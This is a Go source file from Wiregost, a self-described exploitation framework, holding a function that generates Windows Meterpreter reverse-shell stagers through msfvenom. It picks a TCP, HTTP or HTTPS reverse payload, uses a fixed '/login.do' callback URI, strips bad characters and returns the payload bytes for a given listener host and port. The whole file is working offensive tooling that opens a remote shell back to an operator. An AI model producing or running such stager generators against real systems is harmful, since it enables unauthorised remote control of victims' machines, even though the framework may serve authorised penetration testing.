// Wiregost - Golang Exploitation Framework
// Copyright © 2020 Para
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

package generate

import (
	"fmt"

	"github.com/maxlandon/wiregost/server/log"
	"github.com/maxlandon/wiregost/server/msf"
)

var rpcLog = log.ServerLogger("generate", "msf_stager")

func GenerateMsfStage(host string, port uint16, architecture string, format string, protocol string) ([]byte, error) {
	// func generateMsfStage(config *clientpb.EggConfig) ([]byte, error) {
	var (
		stage   []byte
		payload string
		arch    string
		uri     string
	)

	switch architecture {
	case "amd64", "x64", "64", "x86_64":
		arch = "x64"
	default:
		arch = "x86"
	}

	//TODO: change the hardcoded URI to something dynamically generated
	switch protocol {
	case "tcp":
		payload = "meterpreter/reverse_tcp"
	case "http":
		payload = "meterpreter/reverse_http"
		uri = "/login.do"
	case "https":
		payload = "meterpreter/reverse_https"
		uri = "/login.do"
	default:
		return stage, fmt.Errorf("Protocol not supported")
	}

	venomConfig := msf.VenomConfig{
		Os:       "windows", // We only support windows at the moment
		Payload:  payload,
		LHost:    host,
		LPort:    uint16(port),
		Arch:     arch,
		Format:   format,
		BadChars: []string{"\\x0a", "\\x00"}, //TODO: make this configurable
		Luri:     uri,
	}
	stage, err := msf.VenomPayload(venomConfig)
	if err != nil {
		rpcLog.Warnf("Error while generating msf payload: %v\n", err)
		return stage, err
	}
	return stage, nil
}
